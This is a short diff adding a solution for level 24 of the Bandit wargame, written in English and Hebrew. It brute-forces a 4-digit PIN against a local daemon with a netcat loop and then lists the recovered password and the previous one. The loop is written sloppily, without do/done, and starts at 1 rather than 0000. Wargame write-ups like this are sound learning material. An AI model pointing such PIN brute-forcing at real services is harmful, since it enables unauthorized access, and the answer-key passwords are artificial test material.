@@ -1,0 +1,20 @@
+This is the solution of stage 24
+A daemon is listening on port 30002
+and will give you the password for bandit25 
+if given the password for bandit24 and a secret numeric
+4-digit pincode. There is no way to retrieve the pincode
+except by going through all of the 10000 combinations,
+called brute-forcing.
+
+צריך לקחת את הסיסמא מהשלב הקודם ולצרף לה קוד של 4 ספרות ולשלוח לפורט 30002
+הדרך היחידה לגלות את הקוד זה לעשות ברוט-פורס
+ברוט פורס נעשה באמצעות הלולאה הבאה שזה גם הפתרון
+
+1) for i in {1..9999}  
+   echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002
+
+
+Password: 
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
